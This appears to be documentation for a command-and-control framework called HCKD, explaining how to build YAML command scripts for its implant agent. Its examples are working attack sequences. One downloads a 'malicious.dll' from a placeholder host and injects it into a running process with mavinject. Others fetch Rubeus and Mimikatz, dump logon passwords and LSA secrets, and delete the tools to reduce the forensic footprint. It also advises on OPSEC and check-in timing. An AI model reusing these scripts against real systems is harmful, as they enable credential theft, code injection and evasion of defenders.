# **Building Your Own Command Scripts**  

HCKD’s YAML-based system is designed for flexibility and modularity, allowing you to create structured command sequences tailored to your needs. This section provides a technical deep dive into structuring, executing, and optimizing your own scripts.

Note: This isn’t a full-fledged scripting language—there are no variables or advanced logic, just a structured way to define and execute commands in sequence.

---

## **YAML Structure Overview**  

Each script follows a strict hierarchy:  

```yaml
commands:
  - name: <command_name>
    description: "<brief description>"
    steps:
      - action: <action_type>
        args: ["<arg1>", "<arg2>", ...]
```

### **Key Elements:**
1. **`name`** → The identifier for the command. Must be unique.  
2. **`description`** → A short explanation of what the command does.  
3. **`steps`** → A list of execution steps, each defined by:  
   - **`action`** → The actual command to run (e.g., `shell`, `upload`, `get_file`).  
    - Also refered to as the `command`, such as in the HTTP comms section
   - **`args`** → A list of arguments passed to the action, formatted as an array.  

---

## **Execution Flow**  

HCKD processes each script dynamically:

1. **Command Validation** 

    - The provided command name is matched against the YAML configuration.  
    - If no match is found, it is assumed that the command is not in the script, and instead on the agent itself.
        
        - (ex, `shell whoami` would passthrough to the agent itself) 

2. **Step Execution**  

    - Each `step` is processed **in order**.  
    - The `action` is mapped to a core function inside the agent.  
    - The `args` are formatted into a single **space-separated string** for execution.  

---

## **Step Execution: How the String is Processed**
Each step undergoes transformation from **structured YAML** to **an execution-ready command string**.  

### **Example Input in YAML**
```yaml
steps:
  - action: shell
    args: ["whoami /all"]

  - action: get_file
    args: ["http://someip/malicious.dll", "C:\\malicious.dll"]

  - action: start-process
    args: ["mavinject", "<PID>", "/INJECTRUNNING", "C:\\malicious.dll"]
```

### **Processing in Python**
Each step is extracted, formatted, and converted into a command string:
```python
for step in command_steps:
    action = step.get("action")
    args = step.get("args", [])
    args_str = " ".join(args) if isinstance(args, list) else str(args)
    full_command = f"{action} {args_str}".strip()
    command_queue_list.append(full_command)
```

### **Transformation Steps**
| **Step**            | **Original (YAML)**                              | **Extracted (Python Dict)**                            | **Formatted String**                         |
|---------------------|-------------------------------------------------|------------------------------------------------------|---------------------------------------------|
| **Step 1**         | `shell ["whoami /all"]`                          | `{"action": "shell", "args": ["whoami /all"]}`      | `"shell whoami /all"`                       |
| **Step 2**         | `get_file ["http://someip/malicious.dll", "C:\\malicious.dll"]` | `{"action": "get_file", "args": ["http://someip/malicious.dll", "C:\\malicious.dll"]}` | `"get_file http://someip/malicious.dll C:\\malicious.dll"` |
| **Step 3**         | `start-process ["mavinject", "<PID>", "/INJECTRUNNING", "C:\\malicious.dll"]` | `{"action": "start-process", "args": ["mavinject", "<PID>", "/INJECTRUNNING", "C:\\malicious.dll"]}` | `"start-process mavinject <PID> /INJECTRUNNING C:\\malicious.dll"` |

---

## **Examples**  

### **1. Shell Command Execution**  
Used for running system commands directly.  

#### **Example: Running Recon Commands**  
```yaml
commands:
  - name: recon
    description: "Gather system information"
    steps:
      - action: shell
        args: ["whoami /all"]

      - action: shell
        args: ["ipconfig /all"]

      - action: shell
        args: ["netstat -ano"]
```
🔹 **Execution Output:**  
```
shell whoami /all
shell ipconfig /all
shell netstat -ano
```

---

### **2. File Download & Execution**  
Used for retrieving and running payloads.  

#### **Example: Download and Inject a DLL**  
```yaml
commands:
  - name: inject_dll
    description: "Download and inject a DLL into a running process"
    steps:
      - action: get_file
        args: ["http://someip/malicious.dll", "C:\\malicious.dll"]

      - action: start-process
        args: ["mavinject", "<PID>", "/INJECTRUNNING", "C:\\malicious.dll"]
```
🔹 **Execution Output:**  
```
get_file http://someip/malicious.dll C:\malicious.dll
start-process mavinject <PID> /INJECTRUNNING C:\malicious.dll
```

---

### **3. Sleep & Timing Control**  
Used to change the checkin time of the agent.

A nice trick for if you need the commands to run faster, and not take forever, is to just pop some sleep commands in there to change the checkin timing

#### **Example: Modify Sleep Timing**  
```yaml
commands:
  - name: timed_execution
    description: "Run commands with shorter checkin times"
    steps:
      - action: sleep
        args: [2]  # Shrink sleep to 2 seconds

      - action: shell
        args: ["dir C:\\"]

      - action: shell
        args: ["dir D:\\"]

      - action: sleep
        args: [10]  # crank it back up at the end of the script
```
🔹 **Execution Output:**  
```
sleep 2
shell dir C:\
shell dir D:\
sleep 10
```

### **4. Sync & Async**

This example demonstrates how to use synchronous and asynchronous execution modes to manage dependencies between commands. It shows a scenario where a file needs to be downloaded, extracted, and then processed. Synchronous mode ensures each step completes before the next one begins, preventing errors that could occur if steps overlap, such as attempting to extract a partially downloaded file.

Switching to synchronous mode is highly recommended for tasks with variable execution times or dependencies. While long sleep/checkin times *could* be used to approximate this behavior, they do not *guarantee* that tasks will complete successfully if they depend on previous steps. Synchronous mode provides that guarantee.

```yaml
commands:
  - name: download_and_process
    description: "Download a file and process it synchronously"
    steps:
      - action: execution_mode
        args: ["sync"]  # Switch to synchronous mode

      - action: http_get
        args: ["[http://example.com/large_file.zip](http://example.com/large_file.zip)", "C:\\temp\\large_file.zip"] 

      - action: shell
        args: ["unzip C:\\temp\\large_file.zip -d C:\\temp\\extracted"] 

      - action: shell
        args: ["process_data.exe C:\\temp\\extracted\\data.txt"]  

      - action: execution_mode
        args: ["async"] # Switch back to asynchronous mode (optional)
```

### **5. Full Example**
Here's an example script for pulling some tools down:

```
commands:
  - name: ghostpack_execute
    description: "Download and execute a GhostPack tool"
    steps:
      # Reduce sleep time for faster check-in
      - action: sleep
        args: [10]

      - action: execution_mode # flip to sync so the download completes before running the next command
        args: ['sync']

      # Download the GhostPack tool (e.g., Rubeus.exe)
      - action: http_get
        args: ["https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/Rubeus.exe", "C:\\Windows\\Tasks\\sometool.exe"]

      # Execute the tool using shell command
      - action: shell
        args: ["C:\\Windows\\Tasks\\sometool.exe dump"]

      # Delete the tool after execution to reduce forensic footprint
      - action: delete_file
        args: ["C:\\Windows\\Tasks\\sometool.exe"]

      - action: execution_mode
        args: ['async']

      # Restore sleep time
      - action: sleep
        args: [10]
        
  - name: mimikatz_cred_dump
    description: "Download and execute Mimikatz to dump credentials"
    steps:
      # Reduce sleep time for faster check-in
      - action: sleep
        args: [10]

      - action: execution_mode # flip to sync so the download completes before running the next command
        args: ['sync']

      # Download Mimikatz to a less suspicious location
      - action: http_get
        args: ["https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe", "C:\\Windows\\Tasks\\mimi.exe"]

      # Extract logon passwords
        action: shell
        args: ["C:\\Windows\\Tasks\\mimi.exe privilege::debug sekurlsa::logonpasswords exit"]

      # Extract LSA secrets
        action: shell
        args: ["C:\\Windows\\Tasks\\mimi.exe privilege::debug sekurlsa::secrets exit"]


      # Delete the Mimikatz binary and output file for forensic evasion
      - action: delete_file
        args: ["C:\\Windows\\Tasks\\mimi.exe"]

      - action: execution_mode
        args: ['async']

      # Restore sleep time to normal
      - action: sleep
        args: [10]



```


---

## **Best Practices for Custom Scripts**  

### **Keep Commands Modular**  
- Break down complex actions into multiple **smaller actions** instead of having one massive YAML file.
- Example: Instead of one `deploy_payload`, create separate `upload_payload` and `execute_payload` scripts.

<!-- ### ✅ **Leverage Variables for Flexibility**  
- Hardcoded values like `C:\\temp\\payload.bin` can be **parameterized** to make scripts reusable.  
- Example:
  ```yaml
  - action: upload
    args: ["{{payload_path}}", "/var/www/html/payload.bin"]
  ```
  Then, replace `{{payload_path}}` dynamically before execution. -->

### **Handle OPSEC Considerations**  
- Be mindful of **logged commands** when executing actions like `shell`.  
- Use `sleep` strategically to **adjust checkin times** when needed.

---

## **Integrating Custom Scripts with the Agent**  

Your scripts are dynamically loaded before each command is executed, meaning **no hardcoded updates** to the agent are needed. HCKD will:

1. Read the YAML **each time a command is run**.  
2. Convert **each step** into an execution-ready string.  
3. Dispatch the formatted command to the agent.  

This ensures that **modifications to scripts take effect immediately** without needing to restart anything.

---
